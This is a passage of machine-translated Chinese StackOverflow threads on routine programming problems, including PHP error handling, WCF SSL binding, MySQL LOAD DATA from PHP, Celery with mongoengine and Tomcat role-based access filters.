因此，为了能够检查错误，在这种情况下，您需要查看源代码。会有带有错误消息的虚假标签。

[因此，我在StackOverflow](http://stackoverflow.com)中发布的其他[问答](https://stackoverflow.com/questions/14358518/how-to-show-all-php-runtime-errors-in-browser-using-javascript)中的代码处理了这种情况。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-09-06T15:55:06.063

我也有同样的问题。

我尝试了您的解决方案，但成功有限。我其实很喜欢我原来的错误处理程序——它会发送一封电子邮件。当我过去只用 php 构建页面时，我发现我不需要发送电子邮件，因为错误会很好地显示出来。现在我正在转向 html 的 javascript 呈现，错误没有显示，或者被隐藏。导航到日志有点痛苦，页面源更好，但我的电子邮件始终处于打开状态。它构建了一条错误消息并将其与消息一起通过电子邮件`echo`发送，但正如我们所知，这是转储到页面源并且没有显示或有时显示为位。

```
function pos_error_handler ($e_number, $e_message, $e_file, $e_line, $e_vars) 
{

$includes = get_included_files();
//var_dump( $includes);
//echo 'WTF';
// Build the error message.
$message = "<p>Nice Job moron: A pos error occurred in script '$e_file' on line $e_line: $e_message\n<br />";
// Add the date and time:
$message .= "Date/Time: " . date('n-j-Y H:i:s') . "\n<br />";
// Append $e_vars to the $message:
$message .= "<pre>Error Variables:<br />" . print_r ($e_vars, 1) . "</pre>\n</p>";
// what is the url?
$message .= "<p><pre>URL: " .getPageURL()   . "</pre>\n</p>";
$message .= '<pre>Session variables:<br />' . print_r($_SESSION,1). "</pre>\n</p>";
$message .= '<pre>Bactrace:<br />' . print_r(debug_backtrace(),1). "</pre>\n</p>";
if (!LIVE) 
{ 
// Send an email to the admin:
    mail(SUPPORT_EMAIL, 'TEST Site Error!', $message, 'From: ' . SUPPORT_EMAIL);
    // Development (print the error).

    echo '<div class="error">' . $message . '</div><br />';

}
else 
{ 

    // Send an email to the admin:
    mail(SUPPORT_EMAIL, 'Site Error!', $message, 'From: ' . SUPPORT_EMAIL);
    // Only print an error message if the error isn't a notice:
    include(HEADER_FILE);
    if ($e_number != E_NOTICE) 
    {
        echo '<div class="error">A system error occurred. We apologize for the inconvenience.</div><br />';
    }
    echo '<div class="error">An Error has occurred and has been emailed to the administrator. Please note the conditions that caused this error and send a note to the administrator</div><br />';
}
//include(FOOTER_FILE);
exit();
} 
```******

# .net - 为自托管 WCF 服务启用 SSL 绑定

> ID：14348255
> 
> 赞同：0
> 
> 时间：2013-01-15T22:38:30.713
> 
> 标签：.net, wcf, iis, ssl-certificate

我运行一个自托管的 WCF 服务，我想用自签名 SSL 证书保护它。为此，我需要将此 SSL 证书与某个端口绑定。有几种方法可以做到：

1.  根据这个[http://msdn.microsoft.com/en-us/library/ms733791.aspx](http://msdn.microsoft.com/en-us/library/ms733791.aspx)，我可以使用`netsh`它并且它可以工作，但我不想依赖netsh并从.NET代码中做所有事情。

2.  所以我找到了以下片段：

    ```
     using (ServerManager manager = new ServerManager())
        {
            Site site = manager.Sites.FirstOrDefault(i => i.Applications.Cast<Application>().Any());
            Application app = site.Applications.Cast<Application>().First();
            site.Bindings.Add(":*:PORTN", cert.GetCertHash(), store.Name);
            manager.CommitChanges();
        } 
    ```

它可以工作，但是这需要安装 IIS。否则我会收到以下异常：

> 由于以下错误，检索具有 CLSID {2B72133B-3F5B-4602-8952-803546CE3344} 的组件的 COM 类工厂失败：80040154 未注册类（HRESULT 异常：0x80040154 (REGDB_E_CLASSNOTREG)）。

所以，问题是 - 有没有办法在托管代码中完成这个，但不必安装 IIS？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-16T20:21:21.107

找到我的问题的正确答案：[Binding an SSL certificate to a port programmatically](https://stackoverflow.com/questions/1702596/binding-an-ssl-certificate-to-a-port-programmatically)

而不是像我这样使用托管类，`ServerManager`我需要依赖 P/Invoking 本机 API，例如`HttpSetServiceConfiguration`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-16T14:17:39.993

> 有什么方法可以在托管代码中完成此操作，而无需安装 IIS？

是的，并且假设您作为具有足够权限的服务运行，可以调用 NETSH 根据需要使用 Process.Start 和 WaitForExit 执行允许和禁止，并且可以实现您在问题中需要的内容。

NETSH的命令行语法[http://technet.microsoft.com/en-us/library/cc725882(WS.10).aspx](http://technet.microsoft.com/en-us/library/cc725882(WS.10).aspx)允许您做任何您需要的事情。

如果你想弄清楚所有的 P/Invoke，但这听起来很麻烦，但这听起来像是学术练习，内存泄漏等风险更大。

如果您在 Windows XP 上运行并且担心 NETSH 无法满足您的需求，那么您还可以在此处获取 Microsoft 的 HTTPCFG [http://msdn.microsoft.com/en-us/library/windows/desktop/aa364478%28v= vs.85%29.aspx](http://msdn.microsoft.com/en-us/library/windows/desktop/aa364478%28v=vs.85%29.aspx)

# php - 在 PHP 中使用 mysql LOAD 语句失败，但可以通过命令行进行

> ID：14348257
> 
> 赞同：0
> 
> 时间：2013-01-15T22:38:41.653
> 
> 标签：php, mysql

我有一个 php 网页，可以让我们上传文件。我想从 $_FILE 中提取文件名，然后将所有数据加载到我的数据库中。

我的代码如下所示：

```
 $myfile = $_FILE['file']['tmp_file'];
 $executebatchloadsql = 'LOAD DATA LOCAL INFILE "'. $myfile .'" INTO TABLE testtable (fname, lname);
 mysql_query($executebatchloadsql) or die(mysql_error()); 
```

但是我收到的错误消息说：

> 此 MySQL 版本不允许使用的命令

我的问题如下

1.  我应该使用`tmp_file`名称还是名称？
2.  我需要做什么才能使加载数据命令起作用？我试图关注在[MySQL 上找到的帖子：启用 LOAD DATA LOCAL INFILE](https://stackoverflow.com/questions/10762239/enable-load-data-local-infile)但它仍然给我同样的错误。

**编辑1：**

这就是我的 /etc/mysql/my.cnf 部分的样子：

```
[mysqld]

user            = mysql
pid-file        = /var/run/mysqld/mysqld.pid
socket          = /var/run/mysqld/mysqld.sock
port            = 3306
basedir         = /usr
datadir         = /var/lib/mysql
tmpdir          = /tmp
lc-messages-dir = /usr/share/mysql
skip-external-locking
local-infile 
```

最后一行是我添加的。我还在 [mysql] 部分添加了同一行：

```
[mysql]
local-infile 
```

进行这些更改后，我重新启动了 sql：

```
/etc/init.d/mysql restart 
```

但我仍然有问题

**编辑2：**

根据我上面提到的同一篇文章，我也尝试了 local-infile=1 。但这也行不通。

**编辑 3**

我试图将 FILE prvil 添加到用户.. 像这样：

```
GRANT FILE ON *.* TO root; 
```

然后当我显示它授予 root 权限时，我可以看到它已被添加。但我仍然收到一条错误消息，指出我的 mysql 版本不允许使用的命令。我的 my.cfg 文件中的 infile 之后是否需要“=1”？

**编辑4：**

作为进一步的测试，我尝试通过命令行而不是通过 php 手动加载文件，它接受了它。我以 root 身份登录（这与我使用我的应用程序进行测试的 id 相同），然后我尝试了以下命令：

```
mysql> load data local infile '/var/www/testwebsite/abc.csv' into table testtable;
Query OK, 3 rows affected, 48 warnings (0.00 sec)
Records: 3  Deleted: 0  Skipped: 0  Warnings: 48 
```

但我似乎无法让 PHP 代码正常工作。谢谢。！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-05-22T12:30:40.823

从 MySQL 5.0 升级到 5.5 后，我发现我突然必须在 PHP 中创建连接时专门启用 LOCAL INFILE。

使用 mysql：

```
mysql_connect(server,user,code,false,128); // 128 enables LOCAL INFILE
mysql_select_db(database); 
```

使用 mysqli：

```
$conn = mysqli_init();
mysqli_options($conn, MYSQLI_OPT_LOCAL_INFILE, true);
mysqli_real_connect($conn,server,user,code,database); 
```

# sql - 在某些列上访问选择不同的

> ID：14348259
> 
> 赞同：2
> 
> 时间：2013-01-15T22:38:48.767
> 
> 标签：sql, vba, ms-access, ms-access-2007

我有一张包含一些搜索结果的表格。搜索结果可能会重复，因为可以使用不同的度量找到每个结果。然后我想查询这个表，只选择使用 ID 列的不同结果。总而言之，我有一个带有 ID 列的表，但 ID 可能会重复，并且我只想使用 MS Access SQL 选择每个 ID 中的一个，我应该怎么做呢？

好的，在尝试了一些建议后，我有更多信息。Mins 和 Maxes 不起作用，因为它们正在操作的列无法显示。我收到一个错误，就像 `You tried to execute a query that does not include the specified expression...`我现在已经对所有数据进行了排序一样，这就是它的样子

```
ID|Description|searchScore
97     test        1  
97     test        .95
120    ball        .94
97     test        .8
120    ball        .7 
```

所以问题是，由于使用不同的搜索条件将行放入表中，因此我复制了具有不同分数的行。我想要做的是只选择一个按降序`ID`排序的每个`searchScore`。有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T22:42:40.863

```
SELECT DISTINCT ID
FROM Search_Table; 
```

根据您问题的最后更新，以下查询似乎是合适的。

```
SELECT ID, [Description], Max(searchScore)
FROM Search_Table
GROUP BY ID, [Description]; 
```

但是，这与 Gordon 昨天的建议几乎相同，所以我不确定这是否是您想要的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-15T22:52:52.263

您可以通过以下方式获取其中一个搜索条件：

```
select id, min(search_criteria)
from t
group by id 
```

这将始终按字母顺序返回第一个。您还可以轻松地使用`max()`.

您还可以使用：

```
select id, first(search_criteria)
from t
group by id 
```

# php - 按位 7 | ~5 = -1；严重地？

> ID：14348262
> 
> 赞同：2
> 
> 时间：2013-01-15T22:39:08.030
> 
> 标签：php, bit-manipulation

我今天一直在尝试再次找出按位运算符，有些事情对我来说仍然有点模糊。在我开始尝试结合 | 之前，一切都是有意义的。带有 ~ 的运算符，例如：`number | ~number`. 在旁注中，我已经阅读了关于二进制补码的维基百科文章，并理解了它的这一方面（我认为）。

```
------------------------------------------
| 128 | 64 | 32 | 16 |  8 |  4 |  2 |  1 |
------------------------------------------
|   0 |  0 |  0 |  0 |  0 |  1 |  1 |  1 | = 7
------------------------------------------
|   1 |  1 |  1 |  1 |  1 |  0 |  1 |  0 | = ~5 or -6
------------------------------------------ 
```

使用 & 运算符`7 & ~5`会产生 2 的预期结果，因为在两行中都设置了 2 列。让我在这里的`7 | ~5`是输出-1。我希望它要么是 255，因为每一列都有一个 1，要么是 5，因为底行可能算 0 而不是 1。但这两者都不是，它是-1。

我已经用谷歌搜索了这个，直到我的大脑受伤，我在任何地方都找不到一篇解决这个问题的文章。有谁知道这里发生了什么？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-01-15T22:40:28.410

的结果`7 | ~5`是全为 1 的位模式。这是二进制补码中的 -1。

# java - 如何让 JavaScript 使用服务器端的变量？

> ID：14348265
> 
> 赞同：0
> 
> 时间：2013-01-15T22:39:23.010
> 
> 标签：java, javascript, jsp, servlets

我们有 jsp，它使用一些 java bean 来创建一些要在 jsp 内部使用的变量。我想知道如何与 javascript 共享这些变量？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T22:43:17.260

将您的 bean 值写入 HTML 元素的值或 HTML 元素的属性。给 HTML 元素一个 ID。使用 Javascript 按 ID 或其他访问器检索元素，您可以访问该值。您使用的是 struts 还是其他 Servlet 框架？

一个简单的例子

JSP：

```
 <div id="employeeName">
      <jsp:getProperty name="employee" property="firstName"/>
    </div> 
```

HTML：

```
<script type="text/javascript">var el = document.getElementById("employeeName");</script> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-15T22:44:22.797

您可以使用 JSTL 标记在 JavaScript 代码中输出您的 Bean 值。它远非优雅，但它有效。例如，这是一个 JSP 页面的片段：

```
<script type="text/javascript">
    <c:if test="${imServerSideBean eq false}" >
        var imAJSVariable= new Object();
    </c:if>
//More code here
</script>
<html>
//Code continues 
```

您正在使用 JSTL 选择是否使 JavaScript 变量可见。

# javascript - 我可以相信新数组中的元素等于假吗？

> ID：14348266
> 
> 赞同：0
> 
> 时间：2013-01-15T22:39:31.417
> 
> 标签：javascript

在我测试的浏览器中，将返回一个包含 5 个元素`var a = new Array(5);`的数组。`undefined`由于`undefined`等于，只要我以这种方式测试它们，`false`我就可以认为我的数组是用元素初始化的：`false`

```
if (a[0]) console.log("the element is no longer falsy");
else a[0] = true; 
```

`Array`用值初始化一个安全的方法`false`还是应该避免的黑客攻击？

编辑：我的目标是让它初始化为假值，就像我的例子一样。我想确保这`new Array()`是一种值得信赖的方式。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T22:58:19.243

当您在 Javascript 中初始化一个数组时，它没有元素，也就是说，除非您在其中放置任何东西，否则任何位置都不存在任何元素。您唯一拥有的就是`length`设置为您指定的数字。

当您通过读取它来访问元素并且什么都没有时，您就会得到`undefined`（当您访问不存在的对象的成员时会发生这种情况）。

但是请注意，根本不存在的元素与设置为 的元素并不完全相同`undefined`。例如：

```
var x = new Array(5);
console.log(x[2]);                 // ==> Output is "undefined"
console.log(x.indexOf(undefined)); // ==> Output is "-1" (not present)
x[2] = undefined;
console.log(x.indexOf(undefined)); // ==> Output now is "2" 
```

如果您只关心`true`放置在 an 中的元素是否会被考虑，`if`那么该数组首先会出现以包含`undefined`该`false`上下文中的元素。

但是请注意，即使是Javascript`false`中`true`的一个非常微妙的概念，尤其是因为自动转换......例如

```
console.log([] ? 1 : 2);  // Output is "1", an empty array is "true"
console.log([] == false); // output is "true" (so it's also equal to false!) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-15T22:42:36.747

未定义的值不“等于” `false`，当您*像*`if(undefined)`.

它是否安全，这实际上取决于您使用它的代码。如果你想检查 value 是否真的`false`，你应该使用严格相等和 check `if(val === false)`，这样你就不会把它误认为是任何其他虚假值。

您还可以检查`typeof`变量以确保它是您所期望的：

```
typeof false;      // "boolean"
typeof undefined   // "undefined" 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-15T22:52:19.440

您不必为此初始化数组。

```
var array = [];
console.log(array[0]); // undefined
console.log(!!array[0]); // false (undefined is _falsy_)
array.push("foo");
console.log(array[0]); // "foo"
console.log(!!array[0]); // true ("foo" is _truthy_).
array[1] = "bar";
console.log(array[1]); // "bar"
console.log(array.length); // 2 
```

# web-services - 异步操作的命名约定

> ID：14348269
> 
> 赞同：0
> 
> 时间：2013-01-15T22:39:37.033
> 
> 标签：web-services, naming-conventions

我有一个 Web 服务，它通过异步方法在服务器上触发一些长时间的操作。每个操作有 3 种方法：

*   其中一个开始操作并立即返回一个票号。
*   其中一个是从客户端连续调用的；它接收票号并返回一个布尔值，说明操作是否完成。
*   只有在操作完成后才调用其中的最后一个；它接收票号并返回操作结果。

我不知道如何调用这个方法。我考虑调用这样的方法：

*   OperationName_Start
*   OperationName_IsReady
*   OperationName_GetResult

但我担心我可能会重新发明轮子。这种使用模式是否有任何众所周知的命名约定？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-08-26T06:28:51.990

很遗憾，您第一次无法得到答案。我强烈建议阅读这个[SOA 原则链接](http://www.ibm.com/developerworks/webservices/library/ws-soa-design/ "开发者作品文章")，以更好地理解 Web 服务命名的原则和重要性。

重要的是要记住**从消费者的角度来命名，**并**最大限度地提高可消费性和可重用性**。记住，当您调用服务时，您正在对一个对象执行和操作，即您应该有一个**动词**和一个**名词**，这也很有用。还要记住，Web 服务与面向对象语言中的函数非常相似，因此考虑一下 Web 服务函数的代码是什么样子会很有帮助。

考虑以下场景会很有帮助：

*   如果我更改 Web 服务调用的系统会发生什么？
*   是否有另一种情况可以调用此服务？
*   服务应该有多精细？这些决定对绩效有何影响？

在不了解您要实现的业务背景的情况下，我们将假设提交和电子支付的基本示例。

在这种情况下，您可能有：

*   **ElectronicPayment_SendPayment**（注意：使用“发送”保持业务上下文，而不是技术上下文；发送可以通过电子邮件、邮寄、网络服务。从您的“开始”示例中，您要开始什么；这里，服务的目的是明显）
*   **ElectronicPayment_CheckStatus**（注意：这是从消费者的角度来看。检查处理状态很可能是一项通用服务，可以按照以下方式分离`CheckProcessingStatus (TicketNumber tN)`
*   **ElectronicPayment_RetrieveReciept**（注：请求/响应模式与语义链接。收据和支付的业务上下文保持）

命名是高度上下文相关的，以上内容并不完美，但希望它可以帮助你自己和其他偶然发现这一点的人。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-07-25T14:59:26.857

由于缺乏答案，我认为在这个问题上显然没有一个广泛使用的标准，所以我可以自己推出。

我选择坚持：

*   OperationName_Start
*   OperationName_IsReady
*   OperationName_GetResult

# scala - 使用 scala mongodb casbah 进行嵌套拉取

> ID：14348278
> 
> 赞同：1
> 
> 时间：2013-01-15T22:40:06.483
> 
> 标签：scala, mongodb, casbah

假设我有一个简单的对象

```
{
 "id":"xyz"
 "answers" : [{
   "name" : "Yes",
    }, {
    "name" : "No",
  }]
} 
```

我想从数组中删除答案是

我正在尝试这样的事情，但运气不佳：

```
import com.mongodb.casbah.MongoCollection

val searchObject = MongoDBObject("id"->"xyz");
getCollection().update(searchObject,$pull( "answers" -> ( "name" -> "Yes"))); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-04T12:07:50.520

您需要声明`("name" -> "Yes")`为 a`MongoDBObject`因为查看：

```
scala> $pull( "answers" -> ( "name" -> "Yes"))
res10: com.mongodb.casbah.query.Imports.DBObject = { "$pull" : { "answers" : [ "name" , "Yes"]}} 
```

这不是你想要的，你想拉一个子文档：

```
scala> $pull ( "answers" -> MongoDBObject("name" -> "Yes") )
res11: com.mongodb.casbah.query.Imports.DBObject = { "$pull" : { "answers" : { "name" : "Yes"}}} 
```

# django - Celery 与 Django 和 MongoDB (mongoengine)

> ID：14348280
> 
> 赞同：2
> 
> 时间：2013-01-15T22:40:08.577
> 
> 标签：django, mongodb, celery, mongoengine

1）我正在尝试使用 Celery（以 RabbitMQ 作为代理）和 Django 构建应用程序 - 使用 MongoDB（mongoengine）作为模型的数据库。因此，Web 服务器接收到的请求将转换为任务，并在 Celery 的帮助下排队等待工作人员执行。

我遵循了以下教程：

[http://docs.celeryproject.org/en/master/django/first-steps-with-django.html#configuring-your-django-project-to-use-celery](http://docs.celeryproject.org/en/master/django/first-steps-with-django.html#configuring-your-django-project-to-use-celery)

和

[https://mongoengine-odm.readthedocs.org/en/latest/django.html](https://mongoengine-odm.readthedocs.org/en/latest/django.html)

但我仍然收到以下错误：

配置不当：settings.DATABASES 配置不正确。请提供 ENGINE 值。

正如两个教程中提到的，settings.DATABASES 应该被注释，而不是它应该只有

mongoengine.connect('myDB')

然而错误正是关于没有配置数据库。

（除此之外，我还没有为 Celery 配置任何结果后端。）

任何人都可以帮助我就我必须设置的内容和位置提供建议吗？

2）另一个问题是：在只涉及 Celery 的项目中，总是有一个 Celery 实例。但是在关于使用 Django 和 Celery 构建 Web 应用程序的教程中，我没有看到任何提及这一点。我必须显式实例化 Celery 还是默认情况下在其他地方完成？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-16T10:21:30.990

1）如果有人对答案感兴趣，我终于设法让它工作，但我不确定我是否正确理解发生了什么。

所以显然问题是我没有为 Celery 设置结果后端。将以下行放入 settings.py 后，我就摆脱了错误：

CELERY_RESULT_BACKEND = "amqp"

2）我的项目（我正在使用 djcelery）在没有我明确实例化 Celery 的情况下工作。我假设这是由框架在后面的某个地方完成的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-07-16T19:35:39.373

发生的情况是 Celery 尝试使用 Django 的默认数据库（在 中定义的`settings.DATABASES`那个）作为 Celery Result 数据库，但是要使用 mongoengine 作为您的主要 Django 数据库[，您必须绕过 settings.DATABASES](http://docs.mongoengine.org/en/latest/django.html#connecting)。

所以**只要确保你正确地定义了这两者`BROKER_URL`，`CELERY_RESULT_BACKEND`**这样 Celery 就不会尝试查询 settings.DATABASES。我想您希望它们相同，但您可以选择将它们分开。

```
BROKER_URL = "amqp://guest:guest@localhost:5672//"
CELERY_RESULT_BACKEND = "amqp" 
```

对于其他后端，请参阅[此](http://docs.celeryproject.org/en/latest/configuration.html)。

* * *

您问题的第 2 部分。

你有`CELERY_ALWAYS_EAGER = True`吗`settings.py`？这就是通常情况下不需要单独启动 Celery 进程的方式。但不要在生产中使用它。看到[这个问题](https://stackoverflow.com/questions/3874422/developing-with-djangocelery-without-running-celeryd)。

# c# - 通过将模式存储在 XML 文档中来生成报告

> ID：14348283
> 
> 赞同：0
> 
> 时间：2013-01-15T22:40:18.687
> 
> 标签：c#, asp.net, asp.net-mvc, linq-to-xml

我需要生成`csv`格式的报告。数据被检索为`List<T>`只需要在报告中显示某些列。我正在考虑通过将其架构存储在 App_Data 文件夹下的 XML 文档中并使用 LINQ to XML 来检索字段名称并创建报告。

示例 XML：

```
<report>
<fields>
<field headercaption='Customer Name'>CName</field>
<field headercaption='Address'>CAddress</field>
...
</fields>
</report> 
```

以这种方式完全依赖 XML 文件是可取的，还是我需要通过编码来完成。

**编辑**

`List<T>`字段是需要在 CSV 文件中填充的属性。标题标题是报告中字段的列名称。

样本报告

> 客户姓名、地址、
> 
> 华盛顿独立大街 31 号 ALFKI

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-16T19:46:33.380

如果您只想在运行时在此报告中添加/删除列，则使用纯文本文件会更容易。以您可以轻松解析的格式存储列信息（类似于`CName|Customer Name`）。当您需要生成 CSV 时，读取所有行，按`|`（或您选择的任何分隔符）分割并从那里开始。您可能还想在某处添加有关格式的评论或文档说明*（以防您或其他人需要在一年或更长时间内回来修改它）。*

如果您满足以下条件，XML 可能会变得有用：

*   计划将几份报告放在一个文件中，并可能给它们起名字
*   为其他人提供某种方式来提交他们自己的报告
*   创建一些创作工具以允许人们自定义报告
*   在 CSV 中本地化列名。你可以定义类似的东西

.

```
<report>
<fields>
   <field name="CName">
      <header language="en-us">Customer Name</header>
      <header language="es-es">Nombre de cliente</header>
      ...
   </field>
   ...
</fields>
</report> 
```

*   想尝试使用 XML 库

在这些情况下，XML 可能很有用，因为您可以定义 XSD 并轻松验证提交的报告是否有效。

# python - 如何有效地提取python n-nested dict的叶/分支值？

> ID：14348288
> 
> 赞同：0
> 
> 时间：2013-01-15T22:40:41.180
> 
> 标签：python, dictionary

我有一个 n 层的 dicts 字典，并希望通过一系列键获取叶值。

所以：

```
example_dict = {'level_one':
    {'level_two_a':
        {'level_three_a':[1,2,3], 
         'level_three_b':[4,5,6]
        }, 
     'level_two_b':
        {'level_three_c':[7,8,9], 
         'level_three_d':[10,11,12]
        }
    }
} 
```

有时我会想查询：

```
example_dict['level_one']['level_two_a']['level_three_a'] 
```

其他时候我需要：

```
example_dict['level_one']['level_two_b'] 
```

真正的嵌套字典非常大，所以我想避免这样的事情：

```
result_dict = copy.deepcopy(example_dict)
search_key = ['level_one', 'level_two_a']
for term in search_key:
 result_dict = copy.deepcopy(result_dict[term]) 
```

有没有更节省内存的方法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T22:54:31.423

是的，不要创建这么多副本。只需引用 subdict ：

```
result = example_dict
search_key = ['level_one', 'level_two_a']
for term in search_key:
    result = result[term] 
```

只要您不更改`result`字典，复制副本就没有意义。由于您丢弃了以前的副本并在每次迭代中创建一个新副本，因此您正在浪费 CPU 时间和内存。

即使您确实必须修改`result`并且不希望这些更改影响`example_dict`，您也只需要`result`在循环后复制最终值。

# c# - WCF HTTP GET 参数导致错误请求

> ID：14348295
> 
> 赞同：0
> 
> 时间：2013-01-15T22:41:15.050
> 
> 标签：c#, wcf

我有一个具有以下操作合同的 WCF 服务：

```
 [OperationContract]
    [WebGet(BodyStyle = WebMessageBodyStyle.Wrapped, RequestFormat = WebMessageFormat.Json, ResponseFormat = WebMessageFormat.Json, UriTemplate = "/VerifyKeys.json/{customerKey}/{userKey}")]
    [return: MessageParameter(Name = "MyDetail")]
    MyDetail VerifyKeys(string customerKey, string userKey); 
```

我的方法是这样的：

```
 public MyDetail VerifyKeys(string customerKey, string userKey)
    {
         ...
         return _myDetail;
    } 
```

我的要求是这样的：

```
 http://mydomain.com/MyService.svc/web/VerifyKeys.json/FE3D0F1D-5B8B-4677-B332-70B7ABA80A97/08F4349A-30E5-457D-F2BD-70A23CE17F41?deviceId=66345ec6-a5fe-4b5f-8cf2-1b0d8c344dc2&deviceToken=AgTGERCBaS3d8n2QWxF9EtwcLktIoygoXpc8Y42ObZWja3RSjN%2bFBeshaY4ASainj3MusBbVopXbUFQrrgXUOSkAbOA7tChNKOFNKQ2gB8sEfCe5Du9BZufW4bAP5312MKRqV8g%3d&deviceType=Pink24 
```

我有不同版本的应用程序调用此方法。我没有创建一个新方法，而是在最后使用了一个查询字符串。通过解析url，我可以得到我需要的附加参数。IE。deviceToken、deviceId 和 deviceType

我的请求运行良好，而 deviceToken 参数较小。现在，为我提供设备令牌的公司制造了一个非常庞大的设备令牌。现在我的请求返回错误请求 400。

```
 AgTGERCBaS3d8n2QWxF9EtwcLktIoygoXpc8Y42ObZWja3RSjN%2bFBeshaY4ASainj3MusBbVopXbUFQrrgXUOSkAbOA7tChNKOFNKQ2gB8sEfCe5Du9BZufW4bAP5312MKRqV8g%3d 
```

如果我从查询字符串的末尾删除这些字符，则请求会成功通过。“Q2gB8sEfCe5Du9BZufW4bAP5312MKRqV8g%3d”

我做了一些研究，发现参数的最大值是 255 个字符。我的设备令牌只有 140。

让我更加困惑的是，如果我更改了 deviceId 和 deviceToken 参数的顺序，那么我必须缩短 deviceId 参数才能成功发送。另一个有趣的地方是，如果我尝试缩短任何其他参数，那么我的请求仍然会失败。我必须总是缩短第二个参数。

有没有其他人遇到过类似的问题并找到了解决方案？

如何通过路径末尾的查询字符串发送我的 looong 设备令牌？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T23:49:52.630

可能是查询字符串本身的长度，而不是参数。

尝试添加

```
<httpRuntime maxQueryStringLength="2500" 
maxUrlLength="2500" maxRequestLength="2500" /> 
```

到您的配置，看看错误是否仍然存在

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-16T00:40:46.543

发布此问题后，我找到了解决方案。经常是这样。

设备令牌被保存到 NVARCHAR(100) 字段中。以前这已经足够了。设备令牌现在可以至少为 140 个字符。我将字段更改为 NVARCHAR(255)。问题已解决。不再有错误请求 400。

# java - 如何根据用户登录隐藏某些功能？

> ID：14348298
> 
> 赞同：2
> 
> 时间：2013-01-15T22:41:29.773
> 
> 标签：java, jsp, security, servlets, authorization

我们想在 Tomcat 中隐藏一些基于用户登录的代码功能。我们正在使用基本身份验证。有什么建议么？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-01-15T23:49:07.093

**如果**您的意思只是根据**用户是否登录来**隐藏一些资源，那么这只是限制对某些页面的访问（请参阅下面的参考资料）。

**如果**您想根据**登录者**隐藏某些功能，那么解决方案之一是在 JSP 中检查用户角色并相应地输出内容。

原始示例：
*sample.jsp*

```
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%>
<!DOCTYPE html>
<html>
<head>
    <title>Sample Page</title>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
</head>
<body>
    <c:choose>
        <c:when test="${pageContext.request.isUserInRole('admin')}">
            <p>Content for admin.<p>
        </c:when>
        <c:when test=${pageContext.request.isUserInRole('someRole')}">
            <p>Some content here</p>
        <c:when>
        <c:otherwise>
            <p>Another Content</p>
        </c:otherwise>
    </c:choose>
</body>
</html> 
```

**注意！**
为了能够使用 EL 调用带有参数的方法，您必须使用最低*Servlet 版本 3*。
从这里引用：[https ://stackoverflow.com/tags/el/info](https://stackoverflow.com/tags/el/info)

> 从 EL 2.2 开始，它作为 Servlet 3.0 / JSP 2.2（Tomcat 7、Glassfish 3、JBoss AS 6 等）的一部分进行维护，如果需要，可以使用参数调用非 getter 方法。

* * *

**根据用户角色隐藏/限制对某些页面的访问的另一种方法是在***web.xml*中进行安全配置，或使用注释（最低 Java EE 5），或创建自己的**过滤器**来检查用户的角色要求。

要创建自己的*Filter*，请创建一个实现**[javax.servlet.Filter](http://docs.oracle.com/javaee/6/api/index.html?javax/servlet/Filter.html)**接口的类，并在**[doFilter()方法中使用 HttpServletRequest 方法](http://docs.oracle.com/javaee/6/api/javax/servlet/Filter.html#doFilter(javax.servlet.ServletRequest,%20javax.servlet.ServletResponse,%20javax.servlet.FilterChain))****[isUserInRole()](http://docs.oracle.com/javaee/6/api/javax/servlet/http/HttpServletRequest.html#isUserInRole(java.lang.String))**检查发出请求的用户的角色。

这是一个实现自定义*过滤器*的简单示例：
*RoleCheckFilter.java*

```
package com.example.filter;

import java.io.IOException;

import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

/**
 * Servlet Filter implementation class RoleCheckFilter.
 * Its purpose is to check logged-in user's role and
 * and accordingly allow or prevent access to the web resources.
 */
public class RoleCheckFilter implements Filter {

    /**
     * @see Filter#init(FilterConfig)
     */
    public void init(FilterConfig filterConfig) throws ServletException {}

    /**
     * @see Filter#doFilter(ServletRequest, ServletResponse, FilterChain)
     */
    public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain)
                throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest) req;
        HttpServletResponse response = (HttpServletResponse) res;

        if (request.isUserInRole("admin")) {
            // user have the appropriate rights, allow the request
            chain.doFilter(request, response);
        } else {
            // user does not have the appropriate rights, do something about it
            request.setAttribute("error", "You don't have enough rights to access this resource");
            response.sendRedirect(request.getContextPath() + "/login.jsp");
            // or you could forward a user request somewhere
        }
    }

    /**
     * @see Filter#destroy()
     */
    public void destroy() {}

} 
```

*在web.xml*中添加适当的过滤器配置：

```
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xmlns="http://java.sun.com/xml/ns/javaee"
    xmlns:web="http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"
